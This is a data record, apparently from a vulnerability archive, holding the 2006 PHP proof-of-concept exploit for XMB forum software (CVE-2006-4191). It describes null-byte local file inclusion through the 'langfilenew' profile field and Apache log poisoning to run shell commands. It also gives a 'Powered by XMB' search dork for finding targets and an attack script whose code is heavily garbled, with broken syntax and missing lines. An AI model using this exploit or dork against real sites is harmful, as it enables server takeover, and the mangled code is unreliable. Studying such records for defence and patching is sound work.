{
    "text": "vul_name : XMB <= 1.9.6 Final basename (  ) /'langfilenew' arbitrary local inclusion / remote commands execution ， vul_cve : CVE-2006-4191 ， vul_poc :  #  ! /usr/bin/php -q -d short_open_tag=on ， <? ， echo \"XMB <= 1.9.6 Final basename (  ) 'langfilenew' arbitrary local inclusion / remote commands xctn\\n\" ;  ， echo \"by rgod rgod ( at ) autistici ( dot ) org [ email concealed ] \\n\" ;  ， echo \"site :  ， echo \"dork : \\\"Powered by XMB\\\"\\n\\n\" ;  ， works regardless of php.ini settings ， echo \"Usage : php \". $ argv [ 0 ] .\" host path username password cmd OPTIONS\\n\" ;  ， echo \"host : target server ( ip/hostname ) \\n\" ;  ， echo \"path : path to XMB \\n\" ;  ， echo \"user/pass : you need a valid user account\\n\" ;  ， echo \"cmd : a shell command\\n\" ;  ， echo \"Options : \\n\" ;  ， echo \" -p [ port ]  : Specify a port other than 80\\n\" ;  ， echo \" -P [ ip : port ]  : \\\" a proxy\\n\" ;  ， echo \"Examples : \\r\\n\" ;  ， echo \"php \". $ argv [ 0 ] .\" localhost /xmb/ user pass ls -la\\n\" ;  ， echo \"php \". $ argv [ 0 ] .\" localhost /xmb/Files/ user pass ls -la\\n\" ;  ， die ;  ， } ， software site :  ， vulnerable code in memcp.php at lines 331-333 :  ， . ，  $ langfilenew = $ SETTINGS [ 'langfile' ]  ;  ， } ， . ， this check , when you update your profile and select a new language , can be ， bypassed by supplying a well crafted value for langfilenew argument , ex :  ， ./././././././apache/logs/access.log [ null char ] /English ， basename (  ) returns 'English' and English.lang.php is an existing file in lang/ ， folder , now ， ./././././././apache/logs/access.log [ null char ]  ， string is stored in xmb_members table so , every time you are logged in ,  ， u can include an arbitrary file from ， local resources because in header.php we have this line ， require ROOT.\"lang/ $ langfile.lang.php\" ;  ， and this works regardless of php.ini settings because of the ending null char ， stored in database ， this tool injects some code in Apache log files and tries to launch commands ， error_reporting ( 0 )  ;  ， ini_set ( \"max_execution_time\" , 0 )  ;  ， ini_set ( \"default_socket_timeout\" , 5 )  ;  ， { ，  $ result=' ;  $ exa=' ;  $ cont=0 ;  ， { ， { $ result.=\" .\" ; } ， { $ result.=\" \". $ string [  $ i ]  ; } ， { $ exa.=\" \".dechex ( ord (  $ string [  $ i ]  )  ; } ， { $ exa.=\" 0\".dechex ( ord (  $ string [  $ i ]  )  ; } ，  $ cont+ ; if (  $ cont=15 ) { $ cont=0 ;  $ result.=\"\\r\\n\" ;  $ exa.=\"\\r\\n\" ; } ， } ， } ，  $ proxy_regex = ' ( \\b\\d{1 , 3}\\.\\d{1 , 3}\\.\\d{1 , 3}\\.\\d{1 , 3}\\ : \\d{1 , 5}\\b ) ' ;  ， { ， global $ proxy ,  $ host ,  $ port ,  $ html ,  $ proxy_regex ;  ，  $ ock=fsockopen ( gethostbyname (  $ host )  ,  $ port )  ;  ， echo 'No response from '. $ host.' : '. $ port ; die ;  ， } ， } ，  $ c = preg_match (  $ proxy_regex ,  $ proxy )  ;  ， echo 'Not a valid proxy.' ; die ;  ， } ，  $ parts=explode ( ' : ' ,  $ proxy )  ;  ， echo \"Connecting to \". $ parts [ 0 ] .\" : \". $ parts [ 1 ] .\" proxy.\\r\\n\" ;  ，  $ ock=fsockopen (  $ parts [ 0 ]  ,  $ parts [ 1 ]  )  ;  ， echo 'No response from proxy.' ; die ;  ， } ， } ， fputs (  $ ock ,  $ packet )  ;  ，  $ html=' ;  ，  $ html.=fgets (  $ ock )  ;  ， } ， } ，  $ html=' ;  ，  $ html.=fread (  $ ock , 1 )  ;  ， } ， } ， fclose (  $ ock )  ;  ，  # debug ，  # echo \"\\r\\n\". $ html ;  ， } ，  $ host= $ argv [ 1 ]  ;  ，  $ path= $ argv [ 2 ]  ;  ，  $ user=urlencode (  $ argv [ 3 ]  )  ;  ，  $ pass=urlencode (  $ argv [ 4 ]  )  ;  ，  $ cmd=\" ;  ，  $ port=80 ;  ，  $ proxy=\" ;  ，  $ temp= $ argv [  $ i ]  [ 0 ] . $ argv [  $ i ]  [ 1 ]  ;  ， { ，  $ port=str_replace ( \"-p\" , \" ,  $ argv [  $ i ]  )  ;  ， } ， { ，  $ proxy=str_replace ( \"-P\" , \" ,  $ argv [  $ i ]  )  ;  ， } ， }",
    "time": "2006.08.22"
}